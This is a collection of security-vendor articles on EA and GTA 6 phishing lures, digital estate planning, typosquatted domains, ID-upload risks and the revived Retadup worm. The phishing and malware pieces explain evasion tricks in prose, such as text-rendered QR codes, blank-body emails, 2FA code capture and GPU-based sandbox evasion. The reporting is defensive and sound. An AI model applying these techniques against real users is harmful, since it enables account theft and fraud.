In this article

A fake “FC27 x Prime Gaming” reward site leads to a copied EA sign-in form

The site collects passwords and 2FA codes, putting gamers’ EA accounts at risk

If you entered your login details, change your EA password and review account security settings

Football fans looking for free player packs in EA SPORTS FC 27 could end up handing over their gaming account instead. FC 27 is the latest installment in EA’s soccer video game series. Its Ultimate Team mode lets players build squads using virtual player cards, which they can get by opening packs.

Following the game’s September 25 launch, we identified a fake “FC27 x Prime Gaming” reward page targeting players’ login details. Prime Gaming offers games and in-game rewards as part of an Amazon Prime membership. The fake page borrows that branding, tells visitors their reward is waiting, and asks them to “connect” their EA account—the account they use to access EA games and services.

The series attracts millions of players. EA reported that FC 24 reached more than 11.3 million players worldwide in its first week in 2023, including through EA Play.

On this fake site, there is no reward. The “EA sign-in” that follows is a copy hosted on the scammers’ own domain. It asks for your email address, your password, and the security code from your two-factor authentication (2FA), and sends each one to a server the criminals control. The page’s code is designed to use the server’s replies to decide whether to show a password error or ask for a 2FA code.

This site is not affiliated with EA, Amazon, or Prime Gaming. If you entered your details on a page like this, go to the “How to stay safe” section below.

A reward that’s waiting for you

The landing page is dark purple and styled like a game promo. It says “Your Prime Gaming reward is waiting. Connect your EA account to continue.” Under the button, a smaller line reads “You’ll continue to EA’s official authorization page.”

You don’t. Clicking the button shows “Connecting…” and “Redirecting to EA authorization…”. The code waits a fixed 1.4 seconds and then moves you to /in, which is still on the same domain.

A copied EA sign-in page

The sign-in page closely imitates EA’s own. It has a dark layout, a “Phone or Email” field, “Keep me signed in,” “Sign in with a Passkey,” and a row of Google, Facebook, Apple, and Steam buttons.

The social sign-in buttons do nothing when clicked. Instead, the page steers visitors toward entering their email address and password.

How the theft works, step by step

Each step sends what you type to a separate server, fedserv.thenewsip[.]site.

Email. You enter your email address and move on to the password page.

Password. You enter your password, which is sent to the server. The page uses the server’s reply to decide whether to show an EA-style “Your credentials are incorrect” error or continue, including whether to request a 2FA code. This is consistent with an attempt to check the details against EA, but the captured page code alone does not confirm how the server handles them.

The code. If the account has 2FA, a “Verify your identity” page asks you to click “Send Code” and then enter the six-digit code. The code goes straight to the server.

The exit. The page redirects you to EA’s real Ultimate Team web app at ea.com. Accounts without 2FA skip step three. Arriving at the real site does not mean the preceding sign-in was legitimate.

Capturing a valid 2FA code could let the attackers complete a sign-in before it expires. This doesn’t disable 2FA, but it could allow them to get past that check for a particular login.

Tracking where victims come from

The page records where each visitor came from and sends that “traffic source” to the server along with the submitted details. It recognizes Facebook, Messenger, Meta’s Audience Network, Instagram, and TikTok, through tracking parameters in the link and through Facebook and TikTok ad-click IDs (fbclid, ttclid). Everything else is labeled “direct” or “unknown.”

The kit also has built-in support for Umami web analytics. Whether it’s on depends on a separate settings file that wasn’t part of what we captured. In its default mode, the server’s replies decide whether a visitor’s later steps (password, sending the code, success) show up in the statistics, and the page where victims type their security code isn’t counted in page-view tracking. The settings can also switch to a mode that counts every page.

Together, these features give the operators a way to track traffic attributed to social platforms. They show that the page was built to handle those sources, but do not establish that ads actually ran on them.

Dressed up as an “internal tool”

The HTML asks search engines not to index, archive, or show previews of the page, with a comment that reads “Private team tool — do not index or archive.”

The “Privacy Policy” and “Terms of Service” pages describe an “authentication portal” for “internal use by authorized personnel.”

The kit has two switches. One turns off the Prime Gaming landing page, so the same code would show a plain fake EA sign-in instead. The other chooses between sending victims to EA’s real site and showing the “enrolled for weekly FC 27 rewards” page. In the version we analyzed, both the Prime Gaming lure and the redirect to EA were on.

Why your EA account is worth stealing

An EA account is more than a login. It can hold an FC Ultimate Team club with coins and tradable players, access to purchased games, and saved payment methods. Losing access could put years of purchases and progress at risk.

Attackers could also use a compromised account to impersonate you and trick your gaming contacts into sharing information or clicking scam links.

Safer. Cleaner. Ad-free browsing.

INSTALL BROWSER GUARD

How to stay safe

Start at EA’s website. Type ea.com into your browser and navigate from there. Before entering your EA password or security code, check that the sign-in page is on ea.com or a genuine subdomain, such as accounts.ea.com.

Check the address bar. A page that looks exactly like EA’s sign-in is not EA if the address says something like fc27-prime[.]shop.

Keep security codes private. Only enter an EA verification code on EA’s genuine sign-in page for a login you initiated.

Be wary of free packs, coins, and rewards in ads and posts. A sponsored post isn’t proof that an offer is real.

Use a password manager. It generally won’t offer to autofill your EA password on an unrelated domain, which can help flag a fake page

Already entered your details?

Go directly to ea.com and change your password immediately, even if you didn’t submit a 2FA code.

Review your security settings and trusted devices, remove unfamiliar devices, and check for changes to your email address, linked accounts, and purchases.

Keep 2FA enabled. Change any reused passwords elsewhere, especially on your email account.

If you see unfamiliar linked accounts, are locked out, or have missing content, follow EA’s account-recovery guidance and contact EA Help.

Title: Hijacked by Hype: The Weaponization of GTA 6
Context: Defending Against Hype-driven Attacks As events like the launch of Grand Theft Auto 6 dominate headlines, attacks will continue to exploit the intersection of consumer...
Full Text:
Lead Analysts: Lucy Gee and Cameron Sweeney

With Grand Theft Auto 6 scheduled to launch on November 19, 2026, the 13-year wait for the most anticipated video game release of the decade is nearly over.

As legitimate marketing emails from Rockstar Games increase, video game fans are hyped. The anticipation is massive. However, this unprecedented excitement has created a perfect storm for cybercriminals.

Rockstar and its vast cult following have long fascinated threat actors, with the studio famously suffering massive network breaches and high-profile data leaks in recent years. Now, attackers are pivoting those established tactics directly toward the fanbase.

Threat actors are actively capitalizing on gamers' desperation, knowing that heightened anticipation reliably leads to lower critical thinking. By impersonating Rockstar in a massive, coordinated wave of phishing campaigns, they are weaponizing the promise of exclusive early access, fake "leaked" playable copies, or beta tester invitations to actively exploit both everyday consumers and corporate employees.

This playbook aligns directly with findings from KnowBe4’s Phishing Threat Trends Report Volume 8. That research showed planned calendar events drive the highest volume of lure-based attacks, with campaigns landing an average of 21.3 days before the actual date. On top of that, the lifespan of these planned campaigns more than doubled between 2022 and 2026, giving attackers plenty of time to tweak their angles and test out different lures.

The GTA 6 wave illustrates this dynamic in real time. Data obtained from KnowBe4 Defend shows a rapid, strategic escalation precisely within this pre-launch window:

Key Takeaways:

While GTA-themed phishing accounted for just 0.005% of threats in September, general gaming-related phishing emails have since surged by 1,300% compared to the monthly average across the previous six months (March–August 2026).

For the full week starting October 26th, 24 days before the release, GTA-related lures rapidly scaled to make up 9.6% of all phishing volume.

The First Wave: Mass-Market Noise

Predominantly, this surge is driven by high-volume, spray-and-pray commodity lures. These attacks focus on broad consumer appeal, casting a wide net across millions of inboxes in hopes of catching eager gamers off guard.

In the most widespread campaign, threat actors rely on a minimalist payload delivery to bypass security defenses: the email body is left completely blank, containing nothing more than an embedded link. By stripping away text entirely, the message circumvents basic natural language processing (NLP) filters and spam heuristics that search for suspicious gaming keywords.

To evade domain-reputation blocks, the campaign is heavily polymorphic, distributing waves of messages through constantly rotating webmail accounts with random subject lines so that blocking a single sender provides zero defense against the broader campaign.

Anatomy of the Attack

Clicking the link routes victims through a multi-stage lure that heavily borrows the official Grand Theft Auto 6 aesthetic. Initial landing pages are hosted on graph[.]org, which is Telegram’s lightweight, anonymous and login free publishing site. This allows attackers to host malicious content without registering their own infrastructure, making it easy to stand up pages that slip past filters, especially those looking at domain age.

These pages feature Vice City neon styling, AI generated imagery of characters Lucia and Jason, and prominent Rockstar Games branding. The copy leans into themed phrasing like "The wait is over," "Vice City is calling," and promises of an exclusive "$4,000 bonus" using promo code ROCKSTAR.

Once a user clicks the activate prompt, they are redirected to a fraudulent online casino or crypto platform (such as new2026[.]pro) with the promo code pre-applied. The ultimate objective is dual-pronged monetization: tricking victims into registering an account to harvest passwords they likely recycle across gaming and personal platforms, while simultaneously siphoning payment card details or cryptocurrency deposits under the guise of claiming their GTA-themed welcome bonus. While these mass-market lures lack the sophistication needed to directly compromise enterprise networks, their relentless volume acts as a smokescreen, generating endless background noise for SOC teams.

Campaign Telemetry: Commodity Attack Distribution

Top Targeted Regions: United States (47%), United Kingdom (35%), Germany (8%), France (5%), Rest of World (5%)

Primary Target Verticals: Education (39%), Technology (35%), and Finance (15%)

Campaign: 84 attacks on average per campaign, typically peaking on weekends and evenings.

While these commodity attacks lack sophistication, their sheer volume creates a smokescreen designed to overwhelm SOC teams. The real danger lies in what slips beneath the radar: advanced, targeted phishing campaigns, created to weaponize the intersection of personal interests and organizational trust.

The Second Wave: Targeting the Enterprise

Instead of directly impersonating Rockstar Games, these sophisticated attacks pose as employee benefits programs offering a "free Grand Theft Auto 6 Pre-Order" as a corporate perk. Because a free copy of a highly anticipated game is one of the few things that will convince an employee to check a work email on their days off, these campaigns are heavily weighted toward weekends, accounting for 83.2% of the attack volume. This strategy peaked over the October 31 to November 1 weekend, where GTA-related impersonations made up 42.4% of all phishing emails processed.

In this example, the attacker is combining psychological manipulation with technical evasion elements to ensure the attack lands in users’ inboxes and they’re motivated to click. Rather than impersonating Rockstar directly, which users might view with suspicion, the attacker routes the lure through a fake employee benefits program. Framing the game as a corporate perk carries significantly more weight than standard brand impersonation.

The attack also utilizes senses of urgency, claiming the offer closes in 48 hours and is strictly limited to the first 250 employees. This artificial urgency pushes the victim toward a fast, low-deliberation click. To make the attack look legitimate, the banner at the bottom of the email explicitly states that the message was sent to a verified address and does not collect payment information. This pre-answers the recipient's own suspicions, lowering their guard before they even question the email. By tying the lure directly to the real-world GTA 6 news cycle, the attack feels incredibly timely and relevant, blending seamlessly into the broader hype.

Technical Evasion

Clean Authentication Bypass: The attackers use a genuinely owned, look-alike vendor domain rather than a spoofed one. As the domain is legitimately registered to the threat actor, SPF, DKIM, and DMARC pass cleanly.

Unicode QR Codes: To evade traditional detection, the email uses a QR code rendered entirely out of text block characters (Unicode or HTML tables) rather than a standard image file, allowing it to bypass image QR scanners.

Device Shifting: The ultimate goal of the QR code is to shift the attack off the protected corporate network. By forcing the victim to scan the code with their personal smartphone, the attacker completely bypasses corporate web filtering and Endpoint Detection and Response (EDR) controls.

These sophisticated phishing emails largely followed the same distribution as the commodity attacks. Campaign sizes, however, are much smaller averaging 20 attacks per campaign.

The Corporate Risk of Personal Lures

This blurring of lines between personal interests and professional environments is exactly what makes these attacks so dangerous. While a fake GTA 6 pre-order might initially look like a standard consumer scam aimed at stealing a personal credit card, the reality is far more severe: these campaigns are explicitly designed to compromise corporate assets. When an eager employee scans a malicious QR code on their unmanaged personal phone to claim a supposed "work perk," the resulting phishing page is rarely asking for their bank details. Instead, attackers are weaponizing this gaming hype to harvest credentials; turning a momentary lapse in personal judgment into a full-scale corporate breach.

Defending Against Hype-driven Attacks

As events like the launch of Grand Theft Auto 6 dominate headlines, attacks will continue to exploit the intersection of consumer excitement and corporate access. Threat actors targeted human psychology, not a software zero-day exploit. They identified an emotional blind spot of weekend relaxation and genuine excitement and used it to bypass both technical filters and common sense.

Protecting your organization against these hybrid threats requires a layered approach:

Run Contextual Simulations: Train employees on non-traditional lure types. Especially fake HR perks, vendor discounts, real-world events, and corporate benefits delivered outside typical working hours.

Validate Internal Communications: Establish a clear protocol for corporate benefits so employees know legitimate company perks will always appear on an internal intranet or HR portal, never via unsolicited external email links or urgent QR codes.

Teach the "Device Shift" Red Flag: Educate staff that any work-related email asking them to pull out a personal smartphone to scan a QR code is a deliberate attempt to bypass security perimeter controls.

Normalize Healthy Scrutiny: Remind teams that genuine corporate perks never demand urgency. If an offer says “limited to the first 250 employees,” it’s designed to shut down deliberate thinking.

Harden Quishing Defenses: Ensure your email security layer can detect QR codes, including those rendered as Unicode characters or HTML tables, not just as image files.

When real-world hype peaks, critical thinking drops. Ensuring your workforce and security stack are prepared for both the high-volume noise and the targeted signal is the best defense against turning a pop-culture milestone into a network compromise.

Where KnowBe4 Can Help

These attacks rely on natural human emotions to trick your users. Excitement. A sense of urgency. Whether it’s an invitation to click a link or scan a QR code, your users need to be aware of the varied kinds of attacks bad actors are using.

The KnowBe4 Platform and its suite of tools provides the training your users need with the technology-based defenses to help keep attacks from even reaching the inbox.

AI-Native Security Awareness Training

Hype-based attacks need a quick response to ensure your users have the resources they need to spot them. KnowBe4’s suite of AI Defense Agents (AIDA) includes the capabilities to generate custom phishing simulation templates and whole modules in minutes, helping training admins respond to the newest threats.

KnowBe4 Defend: Real-Time Behavioral AI

KnowBe4 Defend uses behavioral AI and natural language processing to analyze email content and context to clearly flag when emails look suspicious. Defend adds a warning banner directly into the email before the recipient opens it. This interrupts the illusion of legitimacy, such as phishing attacks claiming to offer internal company benefits or perks.

PhishER Plus: Automated Threat Response

Once novel threats are identified, either through machine learning or human observation, PhishER Plus uses this information to keep future users from even seeing them. It automatically categorizes threats, provides immediate feedback to reporters, and enables one-click remediation across all mailboxes. Drawing intelligence from 13+ million global users and integrations with leading security platforms, PhishER Plus delivers unprecedented visibility while providing clear decision-making transparency.

Title: How to prepare your digital accounts for after your death
Context: Microsoft: Set up OneDrive Digital legacy Microsoft’s OneDrive Digital legacy feature lets you give a trusted contact read-only access to your files and photos
Full Text:
A little preparation can make your digital life easier for loved ones to manage after your death. Here’s how to record your wishes, protect your privacy, and give the right people a way to act.

Start with a digital inventory

Your next of kin cannot manage accounts they do not know exist. Create an inventory of the important parts of your digital life, including:

Primary and recovery email addresses

Phones, computers, tablets, and the mobile carrier associated with them

Cloud storage, photo services, and backups

Social media, messaging, and professional networking accounts

Your password manager and its emergency-access arrangements

Online banking, payment, shopping, subscription, and utility accounts

Domains, websites, digital businesses, and developer accounts

Cryptocurrency exchanges, wallets, and the location of securely stored recovery materials

For each service, include the account email or username and a profile link or account reference where relevant.

For each account, record what you want to happen: preserve it, download important data, memorialize it, transfer an asset where permitted, or close it. Identify any photos, documents, or other files you want loved ones to keep, and note where they are stored.

For websites or digital businesses, record who should take over administration and which domains, hosting plans, or other services need renewing.

Keep the inventory separate from sensitive credentials. Do not put your master password, recovery codes, or cryptocurrency seed phrases into an ordinary document and email it around.

Store the inventory securely and make sure your trusted person knows how to find and access it. Check it periodically, especially after changing phones, password managers, email addresses, or financial providers.

Choose who will handle your digital affairs

Choose a trusted person, or several people, to handle your digital affairs. This might be an executor, partner, adult child, or another trusted contact.

Someone who can handle financial administration is not necessarily the person you want reading private messages or looking through photographs and journals. Those responsibilities do not have to go to the same person.

Record your preferences as part of your estate planning. Laws and platform policies vary, and a provider may require proof of authority, a death certificate, or a court order.

In US states that have adopted the Revised Uniform Fiduciary Access to Digital Assets Act (RUFADAA), an executor’s access to digital assets is subject to specific rules. Access to the contents of emails and other private communications generally requires your consent, so discuss recording that permission with your estate-planning lawyer.

If you run a business, own intellectual property, maintain a large online archive, or hold cryptocurrency, consider speaking with an estate-planning lawyer in your jurisdiction.

Set up official legacy tools

Where a provider offers a legacy-contact or inactive-account feature, use it to record your choices. Do not assume that giving someone your password will provide an appropriate or reliable way to manage your account later.

Apple: Add a Legacy Contact

Apple lets you designate one or more Legacy Contacts. After your death, a Legacy Contact can request access to certain Apple Account data using the access key created when you added them and a death certificate.

On an iPhone or iPad, go to:

Settings > your name > Sign-In & Security > Legacy Contact > Add Legacy Contact

Give your chosen person the access key and explain where to find it.

A Legacy Contact can access eligible data, such as photos, messages, and files. They cannot access passwords, passkeys, or payment information stored in iCloud Keychain, or purchased movies, music, books, and subscriptions.

Google: Set up Inactive Account Manager

Google’s Inactive Account Manager lets you choose what should happen if your account becomes inactive. You can nominate trusted contacts, choose which data they may receive, and decide whether the account should later be deleted.

Visit Google’s Inactive Account Manager to set it up. It is triggered by a period of inactivity, rather than confirmation of your death, so choose the waiting period carefully.

Think beyond Gmail. Your Google Account may also hold photographs, documents, calendars, Android backups, and YouTube content.

Be specific about what you want to share. Google says it will not provide survivors with passwords or other login details, so plan for data transfer through the official tool rather than expecting someone to take over your account.

Facebook: Choose memorialization or deletion

Facebook lets you select a legacy contact for your main profile or choose permanent deletion after death.

A legacy contact has limited capabilities after memorialization. These can include posting a pinned notice, changing profile and cover photographs, requesting removal, and if you’ve enabled it, downloading a copy of material you shared.

Review the options in Facebook’s settings and explain your choice to the person you appoint. Memorialization is not the same as granting full access to your account.

Instagram: Record whether you want preservation or removal

Instagram allows people to report an account for memorialization, while verified immediate family members can request removal.

Decide whether you want your posts to remain as a memorial or would prefer the account to be removed. Make that preference known to your family.

Microsoft: Set up OneDrive Digital legacy

Microsoft’s OneDrive Digital legacy feature lets you give a trusted contact read-only access to your files and photos. In OneDrive on the web, go to Settings > Digital legacy, invite your contact, and follow the instructions to generate and securely share an access code. Your contact will need a Microsoft account.

This covers OneDrive files and photos. Access to Outlook email or other Microsoft account information may require a separate legal process.

Other services: Check their individual policies

Not every platform offers legacy contacts or memorialization.

LinkedIn provides a process for an authorized person to request closure of a deceased member’s account, subject to documentation requirements. Others can report a member as deceased for memorialization.

X allows a verified immediate family member or estate representative to request deactivation, but says it cannot provide access to the deceased person’s account.

Check the current policies for every service that matters to you. The requirements may depend on where you live.

Plan for secure access

The goal is to prepare a route for authorized access, not leave a pile of credentials for anyone to find.

A written password list can be lost, copied, photographed, or discovered by the wrong person. Shared credentials can also conflict with a provider’s rules. Instead:

Use a reputable password manager for unique, strong passwords.

Explore its emergency-access or trusted-contact feature, if available.

Keep recovery information and device access instructions in a protected estate-planning location—not an unencrypted note, shared inbox, or group chat.

Account for passkeys and multi-factor authentication. Your plan should cover authenticator apps, trusted devices, recovery methods, and security keys.

Keep securely stored recovery instructions for critical assets, especially cryptocurrency wallets.

Limit access to what each person needs. Someone cancelling subscriptions may not need your private photographs or messages.

Record where sensitive recovery materials are stored and who is authorized to retrieve them, without exposing those materials in the inventory itself.

Leave a short guide for the first week

Alongside your formal plan, leave a short practical guide that answers these questions:

Who should be contacted first?

Where is the digital inventory?

Which email address is the main recovery hub?

Which phone number and mobile carrier are associated with important accounts?

Which profiles should be memorialized, downloaded, or deleted?

Which subscriptions and recurring payments need attention?

Which devices should be preserved before anyone resets, sells, or wipes them?

Which accounts contain work, business, or other people’s data and require special care?

Which files should be saved before accounts are closed or devices are wiped?

Do not make “log in as me” your default instruction. Use official processes and obtain qualified legal advice where necessary, particularly when accounts contain financial assets, business information, or other people’s private data.

Warn your family about impersonation scams

Include a reminder that anyone contacting your family about your accounts should be verified independently.

Leave these precautions with your instructions:

Do not trust an unsolicited caller, email, text, or direct message offering to unlock, recover, memorialize, or close an account.

Do not pay an upfront fee to a stranger offering “recovery” help.

Navigate to the company’s official support site independently.

Do not send death certificates, identity documents, account credentials, recovery codes, or financial information until the recipient and process have been verified.

Preserve suspicious messages and report scams through the appropriate official channel.

Warn family and friends about fake funeral livestream links, which can lead to requests for card details and recurring subscription charges. Confirm any livestream link directly with the funeral organizer.

Work through your plan over time

You do not need to finish everything in one afternoon. Begin with your primary email, phone, password manager, cloud storage, social profiles, and financial or cryptocurrency accounts.

Name a trusted person, record your wishes, and set up the available legacy tools. Then work through the rest of your inventory over time.

We discuss the practical work of preserving digital memories, the tools major platforms offer, and the one step that matters more than any account setting.

Title: How to prepare your data for your death (Lock and Code S07E23)
Context: Protect yourself from online attacks that threaten your identity, your files, your system, and your financial well-being with our exclusive offer for Malwarebytes Premium for...
Full Text:
Your family will one day want your photos. They may not be able to get them.

For a considerable portion of our shared history, whenever people have died, they have left behind physical remains. There are the photo albums, and jewelry, and clothes, even cars. And as surviving loved ones were forced to puzzle out who keeps what, much of the work—at the very least—was tangible.

Death today is different. It’s digital. Photo “albums” are increasingly stored on smartphones and handwritten letters have become a series of texts (never mind the loss of cursive), while social media posts, streaming playlists, and shared online documents have developed a sometimes-equal feeling of sentimentality.

But digital remains can be thorny to preserve. For starters, they’re often managed by companies, not by people. Further, there’s a whole lot more digital remains than most people can organize.

In fact, according to Jed Brubaker, founder of the Digital Legacy Clinic at the University of Colorado Boulder, the average American internet user has 190 online accounts to their name. And preserving what’s in those accounts, Brubaker said, is deeply important not only to loved ones, but to the preservation and continuation of the human species.

“What’s at stake is nothing short of our personal, family, and cultural heritages. All of the things that we use, whether it’s us as individuals to reflect on who we are and our parents, whether it’s that aunt we all have who’s the family genealogist, or whether it’s cultural historians, they have relied on materials that are now increasingly digital. And when everything’s wrapped up into these digital vaults, we are at real risk of that being lost.”

This enormous task, which has very personal demands, is actually within reach.

Earlier this year, Lock and Code looked at what happens to a person’s data after they die, including what rights they have to, say, not be used for training by an AI chatbot. But knowing what happens after your death is hardly useful information if you don’t know how to prepare before.

Today, on the Lock and Code podcast with host David Ruiz, we speak with Brubaker about what can be done beforehand: the actual work of preserving digital remains, what the biggest platforms have built for death, and the one step that matters more than any account setting.

“The most important thing I would encourage them to do is actually not a technical thing. It’s an interpersonal thing, and it’s to tell your loved ones what you want. And you know what? If you don’t know what you want, or if you don’t care, tell them that too.”

Title: Typosquatters Copy Big Brands’ New Domains Within a Day of Registration
Context: Only two pairs did anything else
Full Text:
The name changes were small. Classic typosquatting techniques such as keyboard-adjacent swaps, homoglyphs or hyphen insertion were absent. Instead, the actors favored edits that kept the name readable and plausible, which a hurried reader would be unlikely to notice.

Of the 27 pairs, 15 dropped a plural or possessive “s” (fyzadasavings became fyzadasaving), six left out a single letter (greystarbenefits became greystarbenfits) and four collapsed a double letter (mywayconnect became mywayconect). That makes 25 plain deletions. Only two pairs did anything else. One added a letter (tradealgotcpasettlement became tradealgotcpassettlement) and one swapped a vowel (yourmsdbenefits became yourmsdbenifits).

The dropped plural “s” was the most common edit. Savings became saving, claims became claim and sweeps became sweep. People often say and type the singular form, which may make these the most effective typos. The actors also folded novelty top-level domains (TLDs) back into .com, likely because users default to it; carmax[.]claims became carmaxclaim[.]com and mcdonaldsmedia[.]network became mcdonaldmedianetwork[.]com. A single lookalike could also shadow several authentic domains. For example, carmaxclaim[.]com covered both carmax[.]claims and carmaxclaims[.]com, while yourmsdbenefits[.]com drew three separate variants from two registrars.

Monetization

When queried, the lookalikes served one of three kinds of content. Some were parked placeholder pages that earned money from pay-per-click advertising feeds. Others were deceptive search portals whose results led to scam blogs, or brand-themed blogs written around the typosquatted name and packed with ads that routed visitors to scam sites.

This low-grade scam traffic may not be the end goal. Advertising networks of this kind can also be abused for malvertising and credential harvesting, and a domain that serves ads today could serve a fake claims form tomorrow with a single Domain Name System (DNS) or content change. Visitors who reach these domains are already primed to enter personal details. Symantec continues to track the campaign’s scope and persistence.

Protection

WebPulse, the collaborative intelligence cloud behind Symantec web security, placed the identified domains in security categories and can catch new variants through shared detection patterns.

For more information on Symantec protection against this campaign, see the Protection Bulletin.

Title: Is it safe to upload my passport or ID online?
Context: Identity is the foundation of trust in our digital world
Full Text:
Identity is the foundation of trust in our digital world. It’s how banks, governments, and website owners prove who you say you are. As online laws tighten around the globe and fraud worsens, there’s an ever-greater chance you’ll be asked to provide important identification documents like passports as proof of ID.

But how do you know that information will be properly protected? And what are the risks if something goes wrong? This isn’t theoretical. In May 2026, third-party site the UK Visa Portal exposed at least 100,000 passports and selfies belonging to users.

What’s the risk of uploading my ID?

Once you hand over your details to a third party, they could theoretically be breached by a threat actor, or accidentally exposed to the public through negligence. That’s what happened in the case of the UK Visa Portal, and a separate leak of personal data belonging to nearly one million cannabis users earlier this year.

In the UK Visa Portal incident, passport numbers, full names, dates of birth, contact info, passport scans and selfies were exposed. That could provide a fraudster with a wealth of personally identifiable information (PII) with which to commit identity fraud, unlock your financial accounts, or craft convincing phishing attacks to elicit more sensitive info.

How do I minimize these risks?

There’s no way you can prevent an organization succumbing to a data breach. But there are steps you can take to minimize risk.

· First, double check that the document in question is definitely required. There may be other ways to authenticate, and there may be a way to share some but not all of the details on the document.

· You should also check that the site or portal you’re uploading to is secure and that the domain is correct, in case you have been redirected to a copycat phishing site. Try to use the official site rather than an intermediary.

· Never send sensitive information via email or messaging apps. For peace of mind, consider reading the small print of the privacy notice to check how long your PII will be stored for and what the mechanism is to have it deleted/removed.

Are age verification sites also risky?

As regulations tighten and new rules emerge, age verification for adult content, social media and other websites is becoming more widespread. But many users are understandably concerned about handing their PII over to a third-party verification provider. After new rules came into force in the UK, a surge in searches for VPNs was driven in part by privacy concerns over sharing sensitive information.

The identification documents and selfies you are forced to share with these providers make them a popular target for hackers. Biometrics like face scans are particularly risky as, unlike a passport number, this isn’t data that you can simply replace.

For the same reason, you may be nervous about using services like Tinder Face Check. Although the company says it deletes video selfies “promptly” after assessment, it keeps a “facial map and numerical face template” for the duration of your account. And it retains two “audit images” for 90 days after account closure. It also shares these with third parties.

If you’re unsure about sharing your PII with an age-verification provider, check the reputation of the company first, understand what data it collects and how much it retains, and find out whether it shares that information with any third party. It’s also worth knowing whether you can prove your age without needing to share PII.

Secure your digital identity in the AI era with ESET Identity Protection

Beware of fake visa and travel permit sites

Not all websites requesting your PII have your best interests at heart. Some are deliberately designed to mimic legitimate sites and harvest your personal and financial details for use in follow-on fraud. You might reach them by clicking on a phishing link or a malicious link in the search rankings.

Always verify the domain you’re visiting before sharing any info, and use web security from a trusted provider to block visits to suspicious sites.

What should I do if my ID was in a breach?

Don’t panic if you get a breach notification message. Confirm what was taken, change any passwords you may have shared and switch on two-factor authentication. If financial details were taken, contact your bank or card provider to freeze your account and replace any compromised cards, and monitor for suspicious activity. Have the document in question updated/replaced, and be on the lookout for suspicious communications.

Consider reporting the incident to Report Fraud and/or the ICO (UK), the FTC (US), or the EDPB, which can advise you of the relevant European regulator to contact.

FAQs

Is it safe to upload my passport to a website?

It depends. Once you hand over your details to a third party, they could theoretically be breached by a threat actor, or accidentally exposed to the public. Double check that the document is definitely required and/or whether you can share some but not all of the details on it. Check that the site or portal you’re uploading to is secure and that the domain is correct. Never send sensitive information via email or messaging apps.

Is age verification safe?

In theory, but it depends how secure the verification provider is. Check the reputation of the company first, understand what data it collects and how much it retains, and find out whether it shares that information with any third party. It’s also worth knowing whether you can prove your age without needing to share PII.

Can someone steal my identity from a passport photo?

Not necessarily, as they would need other PII to combine it with in order to effectively commit identity fraud.

What do I do if my passport was in a data breach?

Don’t panic. Confirm what was taken, change any passwords you may have shared and switch on two-factor authentication. If financial details were taken, contact your bank or card provider to freeze your account and replace any compromised cards, and monitor for suspicious activity. Request a replacement passport and be on the lookout for suspicious communications, even if they seem legitimate.

Reporting the incident to the FTC (US), Report Fraud and/or the ICO (UK), or the EDPB, which can advise you of the relevant European regulator to contact.

Is Tinder’s Face Check safe?

It depends on your risk appetite. The company says it deletes video selfies “promptly” after assessment. But it keeps a “facial map and numerical face template” for the duration of your account, and two “audit images” for 90 days after account closure. It also shares information with third parties.

Title: The Retadup worm revives from old USB drives to download CoffeeLoader | Kaspersky official blog
Context: At first glance, the risk of malware seems close to zero
Full Text:
Mass-distributed malware usually spreads in short-lived waves. Cybersecurity companies typically catch any given malware sample within hours or days, so malware creators have to keep churning out new versions. The same goes for command-and-control (C2) servers on the internet, which send instructions to malware and receive stolen data back. And these servers change very often, because hosting providers block the old addresses.

So what happens when you fire up a really old computer, or plug in a thumb drive that has spent five years gathering dust on a shelf? At first glance, the risk of malware seems close to zero. You’d think that after all these years, every antivirus product has every Trojan pegged, and the C2 servers have been sent to the scrapyard. The reality isn’t so simple, and you really can’t afford to let your guard down. A recent example — the Retadup malware — shows exactly why.

The rise and fall of Retadup

One threat that may well be lurking on an old USB stick is the Retadup computer worm. This malware was widespread in 2017. It was written with AutoIt — a legitimate, popular automation tool. When launched, the worm copies itself to every connected flash drive and external disk as hidden files and shortcuts (LNK files). If you plug that drive into a new computer and click the shortcut, the worm sets up shop there, and the cycle starts all over again.

Every computer infected with Retadup was drafted into a botnet that could download and run additional malware on the operator’s command.

In 2019, French law enforcement took the botnet down. The National Gendarmerie seized the C2 servers and used them to tell every bot to self-destruct. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm from the system. Soon after, more than 850 000 computers were disinfected, and the botnet effectively ceased to exist.

Retadup rises from the grave

Every online computer infected with Retadup was disinfected in 2019. But infected flash drives could well have kept copies of the worm. The worm could also have survived on computers that had no internet access or were simply switched off for the duration of the French operation. As it turns out, there were quite a few of these cases.

In 2024, someone started re-registering the domain names that Retadup’s C2 servers once used. When the previous owner stops renewing and paying for a domain name, it eventually becomes available to anyone. Hosting providers’ blocks on expired domains get lifted too. Attackers often take advantage of this. But this time they didn’t grab the name of a popular brand. They went for C2 server names known since 2019, such as alphanoob and radnewage in the .com top-level domain. A Retadup C2 server was then relaunched on these re-registered domains. It could’ve been the worm’s original author or another attacker, since Retadup’s command set and encryption type are very simple.

Now, as soon as someone plugs an infected USB stick into a computer, the old copy of the worm launches, knocks on the C2 server’s door, and… gets a valid response! The response tells the bot to download additional malware. At the moment, that is the far more modern CoffeeLoader.

Of course, what’s left of the botnet is a shadow of its 2019 self. Still, in the first nine months of 2026, Kaspersky products blocked about 15 000 Retadup infection attempts. The worm has been detected primarily in Peru, Angola and Russia.

A coffee nobody ordered

CoffeeLoader, which hitches a ride on Retadup, shows how much more sophisticated cybercriminals’ tools have become. Its end goal is also to download more malware. But first it has to dig in on the infected system and stay under the radar. To do that, CoffeeLoader arrives as a chain of encrypted code fragments, which use graphics card functions to decrypt themselves. This helps the malware slip past detection methods that run a suspicious file in a virtual environment (a sandbox). This detection technique is often used by malware analysts and cybersecurity teams at large companies. If CoffeeLoader successfully decrypts all of its initial components, it adds itself to system startup, and modifies the registry so the user can’t remove the component that launches automatically. After that, CoffeeLoader receives encrypted, digitally signed commands from the server. These let it download and run any other software the attackers want — like infostealers or ransomware.

How to protect yourself from retro malware

The age of a flash drive or computer is no indication of how safe it is. Old malware can lie dormant for years until someone runs it, and then roll out the red carpet for far more modern threats. So before you dig through your digital archives, take a few precautions.

Install updates for your operating system and security software, and update your antivirus databases.

Use a comprehensive security suite on all your computers — including Macs and Linux machines. We recommend Kaspersky Premium, which successfully blocks attacks by Retadup and CoffeeLoader, among other threats.

Turn off autorun for removable media. An autorun infection may seem a relic of the last century, but it is still going strong.

Scan the flash drive before opening any files. Run a full antivirus scan on the drive first, and only then browse its contents. Don’t turn off your protection just because it’s blocking a file you “really need” to open.

